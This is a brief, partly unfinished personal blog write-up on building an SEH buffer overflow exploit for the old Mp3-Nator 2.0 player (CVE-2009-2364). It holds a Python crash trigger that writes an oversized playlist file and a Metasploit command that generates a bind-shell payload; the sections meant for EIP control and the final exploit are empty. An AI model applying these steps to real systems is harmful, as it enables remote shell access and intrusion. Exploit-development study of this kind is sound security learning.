<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta itemprop="name" content="Mp3-Nator 2.0 - Buffer Overflow Exploit (SEH)">
  <title>Mp3-Nator 2.0 - Buffer Overflow Exploit (SEH)</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta itemprop="description" content="CVE-2009-2364">

  
  <meta itemprop="keywords" content="exploitation, seh, overflow, exploit" />
  
    <meta itemprop="wordCount" content="50">
  

  <meta property="og:title" content="Mp3-Nator 2.0 - Buffer Overflow Exploit (SEH)" />
  <meta property="og:description" content="This is my personal blog to keep track of stuff I am doing after hours." />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="http://localhost:1313/blog/2014/05/Mp3-Nator-2.0---Buffer-Overflow-Exploit-SEH/" />
  

  
  <meta property="og:updated_time" content="2014-05-25 11:25:29 &#43;0000 UTC"/>
  
  
  
  

  
    <meta name="twitter:card" content="summary"/>
  

  
  <meta name="twitter:title" content="Mp3-Nator 2.0 - Buffer Overflow Exploit (SEH)"/>
  <meta name="twitter:description" content="This is my personal blog to keep track of stuff I am doing after hours."/>
  
  

  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
  <link href="http://localhost:1313//css/bootstrap.min.css" rel="stylesheet">
  <link href="http://localhost:1313//css/hc.css" rel="stylesheet">

  
  <link rel="stylesheet" href="http://localhost:1313//css/zenburn.css" type="text/css" media="screen" />

  

  
  <link rel="stylesheet" href="http://localhost:1313//lightbox/css/lightbox.css" type="text/css" media="screen">

  <meta name="generator" content="Hugo 0.16" />
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  
  
</head>


  <body>

  
<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
  <div id = "wrapper">

<div class="navbar navbar-default" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a href="http://localhost:1313//"><p class="navbar-brand">camelinc</p></a>
        </div>

        <div class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
					
          <h2>http://localhost:1313/</h2>
					
					<li><a href="http://localhost:1313/about">About </a></li>
					
					<li><a href="http://localhost:1313/post">Posts </a></li>
					
          </ul>
        </div>
      </div>
    </div>

       
       <div id="sidebar-wrapper">
        <ul class="sidebar-nav">
					<img src="/img/avatar.png" />
          <li class="sidebar-brand"><a href="http://localhost:1313//"><h1 class="brand">camelinc</h1></a><h3>This is my personal blog to keep track of stuff I am doing after hours.</h3></li>
          <hr />

					
						<li><a href="http://localhost:1313/about">About </a></li>
					
						<li><a href="http://localhost:1313/post">Posts </a></li>
					
          <hr />

          <div id="social-wrapper">
           
             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
           

           
             
           

           
             
           

           
             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
           
         </div>

       </ul>
     </div>

     <div class="container">


  <div id="article">
    <div class="article-title">Mp3-Nator 2.0 - Buffer Overflow Exploit (SEH)</div>
    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2014-05-25</small></p> <hr/>
    <div class="post">
      

<h2 id="prequisites">Prequisites</h2>

<ul>
<li>Windows XP SP3</li>
<li><a href="http://www.immunityinc.com/products-immdbg.shtml">Immunity Debugger</a></li>
<li><a href="http://www.exploit-db.com/wp-content/themes/exploit/applications/8eb96fd0a43f4e2413fd52f51e7d329c-mp3nator.zip">Mp3-Nator 2.0</a></li>
</ul>

<h2 id="triggering-the-overflow">Triggering the overflow</h2>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python -w</span>

<span class="n">push</span><span class="o">=</span><span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">6000</span>

<span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">&quot;evil.plf&quot;</span><span class="p">,</span><span class="s">&quot;w&quot;</span><span class="p">)</span>
<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">push</span><span class="p">)</span>
<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div>


<h2 id="identifying-eip-offset">Identifying EIP Offset</h2>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">msfpayload windows/console_bind_tcp LPORT=9988 R | msfencode -b &quot;\x00\x0A\x0D&quot; -t c</span>
</code></pre></div>


<h2 id="controlling-eip">Controlling EIP</h2>

<h2 id="the-exploit">The Exploit</h2>

<h2 id="links-and-references">Links and References</h2>

<ul>
<li><a href="http://www.exploit-db.com/exploits/15489/">EDB-ID: 15489</a></li>
<li><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">Exploit writing tutorial part 1 : Stack Based Overflows</a></li>
</ul>

    </div>
  </div>

  <ul class="pager">
    

    
      
        &nbsp;<li class="previous"><a href="http://localhost:1313/blog/2014/05/Easy-RM-to-MP3-Converter/"> Easy RM to MP3 Converter</a></li>
      
    
    
  </ul>



<footer>

  <p class="text-muted credit">&copy; 2016. All rights reserved. </p>

  
  

  <script type="text/javascript" src="http://localhost:1313//js/jquery-2.1.4.js"></script>

  <script src="http://localhost:1313//js/bootstrap.min.js"></script>
  <script src="http://localhost:1313//js/bootstrap.js"></script>
  <script type="text/javascript" src="http://localhost:1313//js/hc.js"></script>

  
  <script type="text/javascript" src="http://localhost:1313//lightbox/js/lightbox.js"></script>
  
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', "UA-83225898-1", 'auto');
    ga('send', 'pageview');
  </script>
  

  

</footer>

	<script data-no-instant>document.write('<script src="/livereload.js?mindelay=10"></' + 'script>')</script></body>
</html>
